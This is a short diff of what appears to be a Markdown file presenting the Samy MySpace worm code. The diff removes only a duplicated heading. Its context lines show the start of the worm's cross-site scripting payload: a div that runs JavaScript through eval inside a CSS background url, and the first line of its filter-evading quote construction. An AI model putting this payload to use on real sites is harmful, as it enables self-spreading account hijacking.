@@ -1,7 +1,5 @@
 # Samy 蠕虫代码
 
-# Samy 蠕虫代码
-
 ```
 <div id=mycode style=”BACKGROUND: url('javascript:eval(document.all.mycode.expr)')” expr=”
 var B = String.fromCharCode(34);
